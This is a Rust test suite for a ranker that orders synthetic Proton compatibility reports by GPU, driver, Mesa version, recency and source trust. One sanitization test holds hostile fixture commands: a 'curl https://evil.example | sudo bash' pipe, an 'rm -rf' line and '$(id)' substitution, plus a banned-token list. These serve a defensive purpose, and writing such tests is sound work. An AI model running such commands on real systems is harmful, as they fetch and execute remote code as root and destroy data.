//! Cenários do ranker com **candidatos sintéticos**: os jogos são reais, os
//! textos não. Verificam a ordem que as regras produzem, não a qualidade em
//! dados reais. Nenhum teste faz rede.

mod ai_ranker {
    use frx_lib::ai::embedder::{EmbedError, Embedder, LexicalEmbedder};
    use frx_lib::ai::models::*;
    use frx_lib::ai::ranker::rank;
    use frx_lib::ai::research_mocked;
    use SourceKind::*;

    /// 2026-11-01T00:00:00Z.
    const NOW: u64 = 1_793_491_200;

    fn gpu(vendor: GpuVendor, name: &str, driver: &str) -> GpuInfo {
        serde_json::from_value(serde_json::json!({
            "vendor": vendor, "vendorId": "0", "deviceId": "0", "name": name,
            "driver": null, "driverVersion": driver, "bootVga": true
        }))
        .unwrap()
    }

    fn query(symptom: &str, appid: u32, game: &str, g: GpuInfo, tool: &str) -> ResearchQuery {
        ResearchQuery {
            symptom: symptom.into(),
            appid,
            system: SystemSnapshot {
                gpus: vec![g.clone()],
                primary_gpu: Some(g),
                vulkan_drivers: vec![],
                mesa_version: None,
            },
            game: GameInfo {
                name: game.into(),
                proton_tool: Some(tool.into()),
            },
        }
    }

    fn rtx() -> GpuInfo {
        gpu(GpuVendor::Nvidia, "NVIDIA GeForce RTX 4070", "580.82.07")
    }

    /// Como no sistema real: `driverVersion` é do módulo do kernel, não do Mesa.
    fn radeon() -> GpuInfo {
        let mut g = gpu(GpuVendor::Amd, "AMD Radeon RX 7800 XT", "6.10.4");
        g.driver = Some("amdgpu".into());
        g
    }

    fn c(source: SourceKind, id: u32, text: &str, date: &str) -> Candidate {
        Candidate {
            source,
            url: format!("https://github.com/ValveSoftware/Proton/issues/{id}"),
            title: format!("Relato {id}"),
            snippet: text.into(),
            raw_text: text.into(),
            published_at: Some(date.into()),
        }
    }

    fn order(q: &ResearchQuery, list: &[Candidate]) -> Vec<String> {
        rank(q, list, &LexicalEmbedder, NOW)
            .unwrap()
            .into_iter()
            .map(|s| s.candidate.title.replace("Relato ", ""))
            .collect()
    }

    #[test]
    fn batman_physx_prefers_the_same_gpu_and_sinks_the_other_vendor() {
        let q = query(
            "poor performance with physx",
            200260,
            "Batman: Arkham City GOTY",
            rtx(),
            "GE-Proton10-34",
        );
        let list = [
            c(
                GithubComment,
                1,
                "It works on my Radeon RX 7800 with physx off.",
                "2026-08-01",
            ),
            c(
                GithubComment,
                2,
                "PhysX performance is fine on my RTX 4070, driver 580.65, GE-Proton10-4.",
                "2026-05-01",
            ),
            c(Umu, 3, "Protonfix for physx performance.", "2025-01-01"),
            c(
                Blog,
                4,
                "Poor performance with physx in an old Proton 5.0 build.",
                "2020-01-01",
            ),
        ];
        let got = order(&q, &list);
        assert_eq!(got[..2], ["2", "3"], "{got:?}");
        // Outra GPU e versão muito antiga ficam negativas e são limitadas a zero.
        let scored = rank(&q, &list, &LexicalEmbedder, NOW).unwrap();
        for s in &scored[2..] {
            assert_eq!(s.relevance, 0.0, "{}", s.candidate.title);
        }
    }

    #[test]
    fn cyberpunk_crash_ranks_a_related_recent_report_over_an_unrelated_one() {
        let q = query(
            "crash on launch",
            1091500,
            "Cyberpunk 2077",
            rtx(),
            "Proton 10.0-3",
        );
        let list = [
            c(
                GithubComment,
                1,
                "Audio crackling in the menu.",
                "2026-09-01",
            ),
            c(
                GithubComment,
                2,
                "Crash on launch with RTX 4080 on Proton 10.0-2.",
                "2026-07-01",
            ),
            c(
                Reddit,
                3,
                "Crash on launch here too, on some GPU.",
                "2026-07-01",
            ),
        ];
        assert_eq!(order(&q, &list), ["2", "3", "1"]);
    }

    #[test]
    fn elden_ring_stutter_penalizes_versions_far_behind() {
        let q = query(
            "stutter in open world",
            1245620,
            "Elden Ring",
            rtx(),
            "Proton 10.0-3",
        );
        let list = [
            c(
                GithubComment,
                1,
                "Stutter in open world on Proton 6.3 with RTX 4070.",
                "2026-01-01",
            ),
            c(
                GithubComment,
                2,
                "Stutter in open world on Proton 10.0-1 with RTX 4070.",
                "2026-01-01",
            ),
        ];
        assert_eq!(order(&q, &list), ["2", "1"]);
        let scored = rank(&q, &list, &LexicalEmbedder, NOW).unwrap();
        assert_eq!(scored[1].features.penalty_stale, 1.0);
        assert_eq!(scored[0].features.penalty_stale, 0.0);
    }

    #[test]
    fn hogwarts_legacy_on_radeon_inverts_the_vendor_preference() {
        let mut q = query(
            "texture flicker",
            990080,
            "Hogwarts Legacy",
            radeon(),
            "GE-Proton10-34",
        );
        q.system.mesa_version = Some("25.3.1".into());
        let list = [
            c(
                GithubComment,
                1,
                "Texture flicker gone, it works on my RTX 4070.",
                "2026-06-01",
            ),
            c(
                GithubComment,
                2,
                "Texture flicker on my RX 7900 with Mesa 25.2.",
                "2026-06-01",
            ),
        ];
        assert_eq!(order(&q, &list), ["2", "1"]);
        let scored = rank(&q, &list, &LexicalEmbedder, NOW).unwrap();
        assert_eq!(scored[1].features.penalty_other_gpu, 1.0);
        assert_eq!(scored[0].features.gpu_match, 1.0);
        assert_eq!(scored[0].features.driver_proximity, Some(1.0));
    }

    #[test]
    fn baldurs_gate_3_trust_and_recency_decide_when_hardware_is_silent() {
        let q = query(
            "freeze after intro",
            1086940,
            "Baldur's Gate 3",
            rtx(),
            "Proton 9.0-4",
        );
        let same = "Freeze after intro.";
        let list = [
            c(Blog, 1, same, "2026-10-01"),
            c(ReleaseNotes, 2, same, "2026-10-01"),
            c(ReleaseNotes, 3, same, "2022-01-01"),
        ];
        // TODO: recalibrar pesos com pilot de 40 casos anotados.
        // Blog de 1 mês superando release note de 5 anos é sintoma de
        // peso não calibrado, não de fórmula errada. Não corrigir sem dado.
        assert_eq!(order(&q, &list), ["2", "1", "3"]);
    }

    #[test]
    fn critical_case_radeon_text_against_rtx_profile_gets_the_penalty_and_low_relevance() {
        let q = query("crash", 1, "Jogo", rtx(), "Proton 10.0-3");
        let list = [c(
            GithubComment,
            1,
            "No crash now, it works on my Radeon RX 7800 XT.",
            "2026-10-01",
        )];
        let s = &rank(&q, &list, &LexicalEmbedder, NOW).unwrap()[0];
        assert_eq!(s.features.penalty_other_gpu, 1.0);
        assert_eq!(s.features.gpu_match, 0.0);
        assert!(s.relevance < 0.1, "{}", s.relevance);
        // A penalidade reduz a pertinência; a fonte continua sendo um relato.
        assert_eq!(s.confidence, ConfidenceLabel::CommunityReport);
    }

    #[test]
    fn high_relevance_never_inflates_confidence() {
        let q = query("crash on launch", 1, "Jogo", rtx(), "GE-Proton10-34");
        let text = "Crash on launch with RTX 4070, driver 580.65, GE-Proton10-4.";
        let list = [
            c(Umu, 1, text, "2026-10-30"),
            c(ReleaseNotes, 2, text, "2026-10-30"),
            c(GithubComment, 3, text, "2026-10-30"),
            c(Reddit, 4, text, "2026-10-30"),
            c(Blog, 5, text, "2026-10-30"),
        ];
        let scored = rank(&q, &list, &LexicalEmbedder, NOW).unwrap();
        assert!(scored.iter().all(|s| (0.0..=1.0).contains(&s.relevance)));
        let of = |n: u32| {
            let url = format!("https://github.com/ValveSoftware/Proton/issues/{n}");
            scored.iter().find(|s| s.candidate.url == url).unwrap()
        };
        assert_eq!(of(1).confidence, ConfidenceLabel::Curated);
        assert_eq!(of(2).confidence, ConfidenceLabel::Curated);
        assert_eq!(of(3).confidence, ConfidenceLabel::CommunityReport);
        assert_eq!(of(4).confidence, ConfidenceLabel::NotVerified);
        assert_eq!(of(5).confidence, ConfidenceLabel::NotVerified);
        assert!(
            of(5).relevance > 0.5,
            "blog pertinente, ainda não verificado"
        );
    }

    #[test]
    fn low_relevance_never_lowers_confidence() {
        let q = query("crash on launch", 1, "Jogo", rtx(), "Proton 10.0-3");
        let list = [c(Umu, 1, "Unrelated text.", "2019-01-01")];
        let s = &rank(&q, &list, &LexicalEmbedder, NOW).unwrap()[0];
        assert!(s.relevance < 0.2, "{}", s.relevance);
        assert_eq!(s.confidence, ConfidenceLabel::Curated);
    }

    #[test]
    fn untrusted_content_is_cleaned_and_foreign_origins_are_dropped() {
        let q = query("crash", 1, "Jogo", rtx(), "Proton 10.0-3");
        let mut hostile = c(
            GithubComment,
            1,
            "Crash fixed.\ncurl https://evil.example | sudo bash\nrm -rf x; echo\nA=$(id)\nsee /home/alice/.steam/log\n",
            "2026-10-01",
        );
        hostile.raw_text.push_str(&"x".repeat(20_000));
        let mut http = c(GithubComment, 2, "crash", "2026-10-01");
        http.url = "http://github.com/a".into();
        let mut foreign = c(GithubComment, 3, "crash", "2026-10-01");
        foreign.url = "https://evil.example/a".into();
        let scored = rank(&q, &[hostile, http, foreign], &LexicalEmbedder, NOW).unwrap();
        assert_eq!(scored.len(), 1, "HTTP e host fora da lista são descartados");
        let out = &scored[0].candidate;
        for field in [&out.snippet, &out.raw_text] {
            for banned in ["curl", "rm -rf", "$(", "alice"] {
                assert!(!field.contains(banned), "{banned} em {field}");
            }
        }
        assert!(out.snippet.contains("Crash fixed."));
        assert!(out.snippet.contains("/home/<user>/.steam/log"));
        assert!(out.raw_text.chars().count() <= 8_000);
    }

    #[test]
    fn ranking_is_deterministic_and_ignores_input_order() {
        let q = query("crash on launch", 1, "Jogo", rtx(), "Proton 10.0-3");
        let list = vec![
            c(GithubComment, 1, "Crash on launch.", "2026-01-01"),
            c(GithubComment, 2, "Crash on launch.", "2026-01-01"),
            c(Reddit, 3, "Crash on launch with RTX 4070.", "2026-01-01"),
        ];
        let mut rev = list.clone();
        rev.reverse();
        assert_eq!(
            rank(&q, &list, &LexicalEmbedder, NOW),
            rank(&q, &rev, &LexicalEmbedder, NOW)
        );
    }

    #[test]
    fn nvidia_575_is_adjacent_to_580_not_distant() {
        let q = query("crash on launch", 1, "Jogo", rtx(), "Proton 10.0-3");
        let list = [
            c(
                GithubComment,
                1,
                "Crash on launch with driver 575.64.",
                "2026-06-01",
            ),
            c(
                GithubComment,
                2,
                "Crash on launch with driver 535.183.",
                "2026-06-01",
            ),
        ];
        let scored = rank(&q, &list, &LexicalEmbedder, NOW).unwrap();
        let adjacent = &scored[0];
        assert!(adjacent.candidate.snippet.contains("575"));
        assert_eq!(adjacent.features.driver_proximity, Some(0.5));
        assert_eq!(
            adjacent.features.penalty_stale, 0.0,
            "famílias vizinhas não são obsoletas"
        );
        assert_eq!(scored[1].features.driver_proximity, Some(0.0));
        assert_eq!(scored[1].features.penalty_stale, 1.0);
    }

    #[test]
    fn amd_report_with_mesa_version_ranks_above_unknown_mesa() {
        let mut q = query("texture flicker", 1, "Jogo", radeon(), "Proton 10.0-3");
        q.system.mesa_version = Some("25.3.1".into());
        let list = [
            c(
                GithubComment,
                1,
                "Texture flicker in the menu.",
                "2026-06-01",
            ),
            c(
                GithubComment,
                2,
                "Texture flicker in the menu, Mesa 25.1.7.",
                "2026-06-01",
            ),
        ];
        let scored = rank(&q, &list, &LexicalEmbedder, NOW).unwrap();
        assert!(scored[0].candidate.snippet.contains("Mesa"));
        assert_eq!(scored[0].features.driver_proximity, Some(1.0));
        assert_eq!(scored[1].features.driver_proximity, None);
    }

    #[test]
    fn mesa_minor_only_breaks_an_exact_tie() {
        let mut q = query("flicker", 1, "Jogo", radeon(), "Proton 10.0-3");
        q.system.mesa_version = Some("25.3.1".into());
        let list = [
            c(GithubComment, 1, "Flicker, Mesa 25.0.7.", "2026-06-01"),
            c(GithubComment, 2, "Flicker, Mesa 25.3.7.", "2026-06-01"),
        ];
        let scored = rank(&q, &list, &LexicalEmbedder, NOW).unwrap();
        assert_eq!(scored[0].relevance, scored[1].relevance, "empate exato");
        assert!(scored[0].candidate.snippet.contains("25.3.7"));
        assert_eq!(
            scored[0].features.driver_proximity,
            scored[1].features.driver_proximity
        );
    }

    #[test]
    fn mesa_distance_reaches_stale_and_proximity_for_amd_and_intel() {
        let cases = [
            ("amdgpu", GpuVendor::Amd, "AMD Radeon RX 7800 XT"),
            ("radeon", GpuVendor::Amd, "AMD Radeon R9 290"),
            ("i915", GpuVendor::Intel, "Intel UHD Graphics 770"),
            ("xe", GpuVendor::Intel, "Intel Arc B580"),
        ];
        // Usuário em Mesa 24.x. Com e sem ponto, como aparece nos relatos.
        let expected = [
            ("Mesa 24", Some(1.0), 0.0),
            ("Mesa 23", Some(0.5), 0.0),
            ("Mesa 23.3.1", Some(0.5), 0.0),
            ("mesa-23.3", Some(0.5), 0.0),
            ("Mesa 22", Some(0.2), 0.0),
            ("Mesa 21", Some(0.0), 1.0),
            ("Mesa 21.3", Some(0.0), 1.0),
            ("Mesa 26", Some(0.2), 0.0),
        ];
        for (driver, vendor, name) in cases {
            let mut g = gpu(vendor, name, "6.10.4");
            g.driver = Some(driver.into());
            let mut q = query("flicker", 1, "Jogo", g, "Proton 10.0-3");
            q.system.mesa_version = Some("24.2.0".into());
            for (mention, proximity, stale) in expected {
                let text = format!("Flicker with {mention} here.");
                let list = [c(GithubComment, 1, &text, "2026-06-01")];
                let s = &rank(&q, &list, &LexicalEmbedder, NOW).unwrap()[0];
                assert_eq!(
                    s.features.driver_proximity, proximity,
                    "{driver}: {mention}"
                );
                assert_eq!(s.features.penalty_stale, stale, "{driver}: {mention}");
            }
        }
    }

    #[test]
    fn unknown_driver_does_not_penalize() {
        let text = "Texture flicker on Radeon RX 7900 with Mesa 20.0.";
        let list = [c(GithubComment, 1, text, "2026-06-01")];
        let mut known = query("texture flicker", 1, "Jogo", radeon(), "Proton 10.0-3");
        known.system.mesa_version = Some("25.3.1".into());
        let mut unknown = known.clone();
        unknown.system.mesa_version = None;
        let (with, without) = (
            rank(&known, &list, &LexicalEmbedder, NOW).unwrap(),
            rank(&unknown, &list, &LexicalEmbedder, NOW).unwrap(),
        );
        assert_eq!(with[0].features.driver_proximity, Some(0.0));
        assert_eq!(with[0].features.penalty_stale, 1.0);
        assert_eq!(without[0].features.driver_proximity, None);
        assert_eq!(without[0].features.penalty_stale, 0.0);
        assert!(without[0].relevance > with[0].relevance);
    }

    #[test]
    fn existing_radeon_against_rtx_still_penalized_by_other_gpu() {
        let q = query("crash", 1, "Jogo", rtx(), "Proton 10.0-3");
        let list = [c(
            GithubComment,
            1,
            "No crash now, it works on my Radeon RX 7800 XT with Mesa 25.1.",
            "2026-10-01",
        )];
        let s = &rank(&q, &list, &LexicalEmbedder, NOW).unwrap()[0];
        assert_eq!(s.features.penalty_other_gpu, 1.0);
        assert_eq!(s.features.driver_proximity, None, "incomparável, não zero");
        assert!(s.relevance < 0.1, "{}", s.relevance);
    }

    #[test]
    fn serialized_candidate_shows_null_driver_proximity() {
        let q = query("crash", 1, "Jogo", rtx(), "Proton 10.0-3");
        let list = [c(GithubComment, 1, "Crash in the menu.", "2026-10-01")];
        let s = &rank(&q, &list, &LexicalEmbedder, NOW).unwrap()[0];
        let json = serde_json::to_value(s).unwrap();
        assert!(
            json["features"].get("driverProximity").is_some(),
            "não pode ser omitido"
        );
        assert!(json["features"]["driverProximity"].is_null());
        println!("{}", serde_json::to_string_pretty(&json).unwrap());
        let with = [c(GithubComment, 1, "Crash, driver 575.64.", "2026-10-01")];
        let s = &rank(&q, &with, &LexicalEmbedder, NOW).unwrap()[0];
        assert_eq!(
            serde_json::to_value(s).unwrap()["features"]["driverProximity"],
            0.5
        );
    }

    struct Failing;
    impl Embedder for Failing {
        fn id(&self) -> &str {
            "failing"
        }
        fn embed(&self, _: &[&str]) -> Result<Vec<Vec<f32>>, EmbedError> {
            Err(EmbedError::NotLoaded)
        }
    }

    #[test]
    fn a_missing_model_is_an_error_not_a_silent_zero() {
        let q = query("crash", 1, "Jogo", rtx(), "Proton 10.0-3");
        assert_eq!(rank(&q, &[], &Failing, NOW), Err(EmbedError::NotLoaded));
    }

    #[test]
    fn the_command_contract_accepts_the_front_end_json_and_marks_mocks() {
        let q: ResearchQuery = serde_json::from_value(serde_json::json!({
            "symptom": "crash on launch",
            "appid": 200260,
            "system": {
                "distro": "CachyOS", "arch": "x86_64", "kernel": "7.3",
                "gpus": [],
                "primaryGpu": {
                    "vendor": "nvidia", "vendorId": "10de", "deviceId": "2786",
                    "name": "NVIDIA GeForce RTX 4070", "driver": "nvidia",
                    "driverVersion": "580.82.07", "bootVga": true
                },
                "vulkanDrivers": []
            },
            "game": { "name": "Batman", "protonTool": "GE-Proton10-34" }
        }))
        .unwrap();
        let out = research_mocked(&q, NOW).unwrap();
        assert_eq!(out.len(), 3);
        assert!(out.iter().all(|s| s.candidate.title.starts_with("[MOCK]")));
        assert!(out.iter().all(|s| s.symptom_method == "lexical-fallback"));
        assert!(out.last().unwrap().candidate.title.contains("AMD"));
        let json = serde_json::to_value(&out[0]).unwrap();
        assert!(json["features"]["gpuMatch"].is_number());
        assert!(json["relevance"].is_number());
        assert!(json["confidence"].is_string());
        assert!(json.get("score").is_none() && json.get("label").is_none());
        println!("{}", serde_json::to_string_pretty(&json).unwrap());
    }
}
